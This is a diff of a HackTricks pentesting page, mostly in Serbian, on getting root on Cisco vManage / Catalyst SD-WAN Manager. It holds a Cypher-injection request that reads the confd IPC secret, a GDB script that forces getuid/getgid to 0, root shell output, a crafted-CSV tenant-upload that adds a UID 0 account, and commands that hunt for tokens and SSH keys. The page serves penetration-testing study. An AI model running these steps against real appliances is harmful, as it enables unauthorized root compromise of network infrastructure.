@@ -2,9 +2,9 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Kada imate code execution na Cisco vManage / *Catalyst SD-WAN Manager* kao `vmanage`, `netadmin` ili `vmanage-admin`, najzanimljivije lokalne privesc površine su obično `confd` CLI stack, `cmdptywrapper` helper, localhost REST APIs i root-owned import/upload handlers.
+Kada dobijete code execution na Cisco vManage / *Catalyst SD-WAN Manager* kao `vmanage`, `netadmin` ili `vmanage-admin`, najzanimljivije lokalne privesc površine su obično `confd` CLI stack, `cmdptywrapper` helper, localhost REST APIs i root-owned import/upload handlers.
 
-Ako vam još uvek treba **initial foothold** na controlleru, prvo pogledajte namensku control-plane stranicu:
+Ako vam i dalje treba **initial foothold** na controller-u, prvo pogledajte dedicated control-plane stranicu:
 
 {{#ref}}
 ../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
@@ -13,22 +13,25 @@ Ako vam još uvek treba **initial foothold** na controlleru, prvo pogledajte nam
 ## Quick local triage
 ```bash
 ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
-ss -lntp | egrep '4565|830'
+ss -lntp | egrep '4565|830|8443'
+find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
 ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
+ls -la /home/vmanage-admin/.ssh 2>/dev/null
+grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
 ```
-Ako je `/etc/confd/confd_ipc_secret` čitljiv sa tvoje početne tačke, Path 1 i Path 2 odmah postaju praktični.
+Ako je `/etc/confd/confd_ipc_secret` čitljiv sa tvog foothold-a, Path 1 i Path 2 odmah postaju praktični. Ako si došao preko remote info leak-a ili webshell-a, proveri i da li već možeš da dođeš do `vmanage-admin` SSH materijala ili multitenancy upload handler-a: istraživanje iz 2026. pokazalo je da su oba bila realistični stepenici.
 
 ## Path 1
 
-(Example from [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))
+(Primer iz [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))
 
-After digging a little through some [documentation](http://66.218.245.39/doc/html/rn03re18.html) related to `confd` and the different binaries (accessible with an account on the Cisco website), we found that to authenticate the IPC socket, it uses a secret located in `/etc/confd/confd_ipc_secret`:
+Nakon što smo malo prekopali kroz neku [documentation](http://66.218.245.39/doc/html/rn03re18.html) povezanu sa `confd` i različitim binarnim fajlovima (dostupno sa nalogom na Cisco website), otkrili smo da za autentikaciju IPC socket-a koristi secret koji se nalazi u `/etc/confd/confd_ipc_secret`:
 ```
 vmanage:~$ ls -al /etc/confd/confd_ipc_secret
 
 -rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
 ```
-Sećate se naše Neo4j instance? Ona radi pod privilegijama korisnika `vmanage`, što nam omogućava da preuzmemo fajl koristeći prethodnu ranjivost:
+Sećate li se naše Neo4j instance? Ona se pokreće sa privilegijama korisnika `vmanage`, što nam omogućava da preuzmemo datoteku koristeći prethodnu ranjivost:
 ```
 GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1
 
@@ -40,7 +43,7 @@ Host: vmanage-XXXXXX.viptela.net
 
 "data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
 ```
-`confd_cli` program ne podržava command line arguments, ali poziva `/usr/bin/confd_cli_user` sa argumentima. Dakle, mogli bismo direktno pozvati `/usr/bin/confd_cli_user` sa sopstvenim setom arguments. Međutim, nije čitljiv sa našim trenutnim privilegijama, pa moramo da ga preuzmemo iz rootfs i kopiramo ga koristeći scp, pročitamo help, i iskoristimo ga da dobijemo shell:
+Program `confd_cli` ne podržava command line arguments, ali poziva `/usr/bin/confd_cli_user` sa argumentima. Zato možemo direktno da pozovemo `/usr/bin/confd_cli_user` sa sopstvenim skupom argumenata. Međutim, on nije čitljiv sa našim trenutnim privilegijama, pa moramo da ga preuzmemo iz rootfs i kopiramo koristeći scp, pročitamo help, i iskoristimo ga da dobijemo shell:
 ```
 vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret
 
@@ -60,14 +63,14 @@ uid=0(root) gid=0(root) groups=0(root)
 ```
 ## Path 2
 
-(Example from [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))
+(Primer iz [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))
 
-Blog¹ by the synacktiv team described an elegant way to get a root shell, but the caveat is it requires getting a copy of the `/usr/bin/confd_cli_user` which is only readable by root. I found another way to escalate to root without such hassle.
+Blog¹ od synacktiv tima opisuje elegantan način da se dobije root shell, ali kvaka je u tome što zahteva dobijanje kopije `/usr/bin/confd_cli_user`, koja je čitljiva samo za root. Našao sam drugi način da eskaliram do root bez takve muke.
 
-When I disassembled `/usr/bin/confd_cli` binary, I observed the following:
+Kada sam disasemblirao `/usr/bin/confd_cli` binary, primetio sam sledeće:
 
 <details>
-<summary>Objdump showing UID/GID collection</summary>
+<summary>Objdump pokazuje prikupljanje UID/GID</summary>
 ```asm
 vmanage:~$ objdump -d /usr/bin/confd_cli
 … snipped …
@@ -98,20 +101,20 @@ vmanage:~$ objdump -d /usr/bin/confd_cli
 ```
 </details>
 
-Kada pokrenem “ps aux”, primetio sam sledeće (_note -g 100 -u 107_)
+Kada pokrenem “ps aux”, uočio sam sledeće (_note -g 100 -u 107_)
 ```
 vmanage:~$ ps aux
 … snipped …
 root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
 … snipped …
 ```
-Hipotetisao sam da program “confd_cli” prosleđuje user ID i group ID koje je prikupio od prijavljenog korisnika aplikaciji “cmdptywrapper”.
+Pretpostavio sam da program “confd_cli” prosleđuje korisnički ID i grupni ID koje je prikupio od prijavljenog korisnika aplikaciji “cmdptywrapper”.
 
-Moj prvi pokušaj bio je da pokrenem “cmdptywrapper” direktno i da mu prosledim `-g 0 -u 0`, ali je neuspeo. Izgleda da je neki file descriptor (-i 1015) kreiran negde usput i ne mogu da ga lažiram.
+Moj prvi pokušaj bio je da pokrenem “cmdptywrapper” direktno i da mu prosledim `-g 0 -u 0`, ali nije uspelo. Izgleda da je negde usput kreiran deskriptor datoteke (-i 1015) i ne mogu da ga lažiram.
 
-Kao što je pomenuto u synacktiv blogu(poslednji primer), program “confd_cli” ne podržava command line argument, ali mogu da utičem na njega pomoću debugger-a i srećom GDB je uključen na sistemu.
+Kao što je pomenuto u synacktiv-ovom blogu(poslednji primer), program “confd_cli” ne podržava komandne argumente, ali mogu da utičem na njega pomoću debagera i, srećom, GDB je instaliran na sistemu.
 
-Napravio sam GDB skriptu u kojoj sam naterao API `getuid` i `getgid` da vraćaju 0. Pošto već imam “vmanage” privilege preko deserialization RCE, imam dozvolu da direktno pročitam `/etc/confd/confd_ipc_secret`.
+Napravio sam GDB skript u kome sam naterao API `getuid` i `getgid` da vraćaju 0. Pošto već imam “vmanage” privilegiju kroz deserialization RCE, imam dozvolu da direktno pročitam `/etc/confd/confd_ipc_secret`.
 
 root.gdb:
 ```
@@ -132,7 +135,7 @@ end
 run
 ```
 <details>
-<summary>Izlaz konzole</summary>
+<summary>Console output</summary>
 ```text
 vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
 GNU gdb (GDB) 8.0.1
@@ -168,66 +171,85 @@ bash-4.4#
 ```
 </details>
 
-## Putanja 3 (2025 CLI bug validacije ulaza - CVE-2025-20122)
+## Putanja 3 (2025 CLI bug pri validaciji ulaza - CVE-2025-20122)
 
-Cisco je kasnije dokumentovao čistiju lokalnu root putanju u svom advisory-ju za [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt): **autentifikovani napadač sa samo read-only privilegijama** mogao je da pošalje crafted zahtev manager CLI-ju i dođe do root zbog nedovoljne validacije ulaza.
+Cisco je kasnije dokumentovao čistiju lokalnu root putanju u svom advisory-ju za [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt): **autentifikovani napadač sa samo read-only privilegijama** mogao je da pošalje posebno izrađen zahtev manager CLI-ju i dobije root zbog nedovoljne validacije ulaza.
 
-Iz ofanzivne perspektive, ovo je važna poenta:
+Iz ofanzivne perspektive, ovo je važan zaključak:
 
-1. Jednom kada imate *bilo kakvo* low-priv uporište na sistemu, trebalo bi da testirate lokalni CLI servis pre nego što krenete na teži Path 1 / Path 2 workflow.
-2. Ponovo iskoristite artefakte iz Path 2 da pronađete trust boundary: `confd_cli` → `cmdptywrapper` → `vshell`.
-3. Svako polje prosleđeno CLI backend-u tretirajte kao sumnjivo: UID/GID, username, terminal metadata, imported files, ili bilo koju vrednost koju kasnije koristi helper pod root privilegijama.
-4. Ako low-priv korisnik može da dođe do lokalnog CLI socket-a i utiče na ta polja, root može biti udaljen samo jedan crafted zahtev.
+1. Kada jednom imaš *bilo kakvo* uporište sa niskim privilegijama na mašini, treba da testiraš lokalni CLI servis pre nego što kreneš na teži Path 1 / Path 2 workflow.
+2. Ponovo iskoristi artefakte iz Path 2 da pronađeš granicu poverenja: `confd_cli` → `cmdptywrapper` → `vshell`.
+3. Svako polje prosleđeno CLI backend-u tretiraj kao sumnjivo: UID/GID, korisničko ime, terminal metadata, importovane fajlove ili bilo koju vrednost koju kasnije koristi helper sa root vlasništvom.
+4. Ako low-priv korisnik može da dođe do lokalnog CLI socket-a i utiče na ta polja, root može biti udaljen samo jedan posebno izrađen zahtev.
 
-Praktičan workflow nakon pristupa appliance-u je:
+Praktičan workflow nakon što se dođe do appliance-a je:
 ```bash
 strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
 strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
 ss -lntp | grep 4565
 ```
-Ovo pretvara bug iz 2025. u dobar hunting obrazac za slične verzije: tražite **local CLI shims koji prikupljaju identitet u userland-u i prosleđuju ga privilegovanijem wrapper-u**.
+Ovo pretvara bug iz 2025. u dobar hunting pattern za slične verzije: traži **local CLI shims that collect identity in userland and forward it to a more privileged wrapper**.
+
+Nemoj da pomešaš **CVE-2025-20122** sa kasnijim **CVE-2026-20122**: problem iz 2025. je *local* CLI-to-root bug, dok je problem iz 2026. *remote* API arbitrary file overwrite koji je uglavnom koristan za postavljanje foothold-a, a zatim ponovni prolazak kroz Path 1 / Path 2 / Path 4.
 
 ## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)
 
-Cisco-ovo februarsko 2026 advisory takođe je uvelo još jednu korisnu privesc klasu: [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) je omogućio **authenticated, local attacker with low privileges** da dobije root zbog nedovoljnog user-authentication mehanizma u REST API-ju.
+Cisco-ov savet iz februara 2026. je takođe uveo još jednu korisnu privesc klasu: [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) je omogućavao **authenticated, local attacker with low privileges** da dobije root zbog nedovoljnog user-authentication mehanizma u REST API-ju.
 
-Ovo je važno zato što vManage privesc više nije ograničen samo na `confd`/TTY abuse. Nakon low-priv shell-a, takođe tražite:
+Ovo je važno zato što vManage privesc više nije ograničen samo na `confd`/TTY abuse. Posle low-priv shell-a, takođe traži:
 
 - localhost-only API endpoints koji previše veruju caller-u
-- tokens, cookies, ili service credentials čitljive iz trenutnog account-a
-- root-only akcije izložene kroz `dataservice`/REST handlers koje se i dalje mogu lokalno okinuti
+- token-e, cookie-je ili service credentials koji se mogu pročitati iz trenutnog naloga
+- root-only akcije izložene kroz `dataservice`/REST handlers koje se i dalje mogu lokalno pokrenuti
 
-U praksi, kada jednom imate shell kao `vmanage` ili drugi service user, local API abuse je često tiši i lakši za automatizaciju nego interaktivni CLI abuse:
+U praksi, kada jednom dobiješ shell kao `vmanage` ili kao drugi service user, local API abuse je često tiši i lakši za automatizaciju nego interaktivni CLI abuse:
 ```bash
 env | grep -iE 'token|cookie|session'
 grep -R "dataservice" /etc /opt 2>/dev/null | head
 ss -lntp | grep -E '(:443|:8443)'
 ```
-Ako je lokalni session context dovoljan da pogodi privilegovanu REST funkcionalnost, preferiraj API path: lakše ga je replay, script, i chain sa stolen web sessions ili API tokens.
+Ako je lokalni session context dovoljan da se pogodi privileged REST funkcionalnost, preferiraj API path: lakše ga je replay, script, i chain sa stolen web sessions ili API tokens.
 
 ## Path 5 (2026 crafted file processed by root - CVE-2026-20245)
 
-Još jedan nedavni pattern je [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx): lokalni attacker sa `netadmin` privilegijama mogao je da upload-uje **crafted file** koji je CLI kasnije nesigurno obradio, što je dovelo do command injection kao `root`.
+Još jedan nedavni pattern je [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx): lokalni attacker sa `netadmin` privilegijama mogao je da uploaduje **crafted file** koji je CLI kasnije nesigurno obradio, što je dovodilo do command injection kao `root`.
 
-Iz HackTricks ugla, vredna tehnika je šira od same konkretne CVE:
+Sa HackTricks stanovišta, vredna tehnika je šira od konkretnog CVE-a:
 
-1. Enumeriši svaki CLI ili web workflow koji prihvata fajl: imports, diagnostic bundles, templates, validators, backups, tenant data, itd.
-2. Prati gde uploadovani fajl završava i koji root-owned script ili binary ga koristi.
-3. Testiraj da li se filename, sadržaj fajla ili parsed metadata ikada prosleđuju shell komandama, wrapper scripts, ili `system()`-style helperima.
-4. Ako već možeš da dođeš do `netadmin` (valid creds, stolen session, ili auth-bypass chain), bugovi u obradi fajlova su često najbrži put do root.
+1. Enumeriši svaki CLI ili web workflow koji prihvata file: imports, diagnostic bundles, templates, validators, backups, tenant data, itd.
+2. Prati gde uploadovani file završava i koji root-owned script ili binary ga koristi.
+3. Testiraj da li se filename, file content, ili parsed metadata ikada prosleđuju shell komandama, wrapper scripts, ili `system()`-style helperima.
+4. Ako već možeš da dođeš do `netadmin` (valid creds, stolen session, ili auth-bypass chain), file-processing bugs su često najbrži put do root.
 
-Ova klasa buga posebno dobro chain-uje sa remote foothold-ovima koji daju `netadmin`, ali ne i `root`.
+Google Cloud / Mandiant je kasnije pokazao veoma konkretan primer ovog bug class-a iskorišćenog kroz multitenancy import path:
+```bash
+request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
+```
+U posmatranom napadu, izrađeni CSV je na kraju izmenio `/etc/passwd` i `/etc/shadow` kako bi kreirao privremeni UID 0 nalog (`troot`). To čini `tenant-upload` / `tenant-list` stil importera posebno zanimljivim: oni nisu samo funkcije za unos podataka, već potencijalni parser front-endovi u vlasništvu root-a.
 
-## Druge nedavne vManage/Catalyst SD-WAN Manager vulns za chain
+Brz shell-side hunting pattern je:
+```bash
+strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
+grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
+```
+Ova klasa buga posebno dobro funkcioniše zajedno sa remote footholds koji daju `netadmin`, ali ne i `root`.
 
-- **Authenticated UI XSS (CVE-2024-20475)** – Ukradi admin session u web UI, zatim pivotuj u API/CLI actions koje na kraju dostižu `vshell` ili jedan od lokalnih privesc path-ova iznad.
-- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – Veoma jak precursor za Path 5 jer je `netadmin` upravo nivo potreban za 2026 crafted-file privesc.
-- **Authenticated arbitrary file write (CVE-2026-20262)** – Korisno za ubacivanje fajlova koji će kasnije biti parsirani od strane privileged components ili za prepisivanje operational artifacts koje koriste root-owned helperi.
-- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – Bolje dokumentovan na posebnoj SD-WAN control-plane stranici; može da doda SSH key za `vmanage-admin`, dajući ti lokalni foothold potreban da se vratiš na ovu stranicu.
+## Other recent vManage/Catalyst SD-WAN Manager vulns to chain
+
+- **Unauthenticated info leak (CVE-2026-20133)** – Posebno visoke vrednosti jer je javno istraživanje pokazalo da može otkriti `confd_ipc_secret` ili privatni ključ `vmanage-admin`, pretvarajući read bug u ili Path 1 ili NETCONF pivot.
+- **Authenticated API arbitrary file overwrite (CVE-2026-20122)** – Različito od 2025 CLI buga iznad; VulnCheck ga je koristio za upload webshell-a, što onda čini lokalne privesc putanje na ovoj stranici odmah relevantnim.
+- **Authenticated UI XSS (CVE-2024-20475)** – Ukradi admin sesiju u web UI, zatim pivotuj u API/CLI akcije koje na kraju dovode do `vshell` ili jedne od lokalnih privesc putanja iznad.
+- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – Veoma jak prethodnik za Path 5 jer je `netadmin` tačno nivo potreban za 2026 crafted-file privesc.
+- **Authenticated arbitrary file write (CVE-2026-20262)** – Slična ofanzivna vrednost kao CVE-2026-20122, ali kroz kasniju web UI upload putanju: upiši u lokaciju koja će kasnije biti parsirana od strane root ili od strane management-plane web sloja.
+- **Downgrade to resurrect old CLI privesc (CVE-2022-20775)** – 2026 intrusions su pokazale da napadači mogu da se vrate na stariju ranjivu SD-WAN verziju, zloupotrebe stari CLI root bug, a zatim vrate originalnu verziju.
+- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – Bolje dokumentovano na namenskoj SD-WAN control-plane stranici; može da doda SSH ključ za `vmanage-admin`, dajući ti lokalni foothold potreban da ponovo posetiš ovu stranicu.
+
+
 
 ## References
 
 - [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
 - [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
-
+- [VulnCheck: Herding Cats - Recent Cisco SD-WAN Manager Vulnerabilities](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
+- [Google Cloud / Mandiant: Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
 {{#include ../../banners/hacktricks-training.md}}
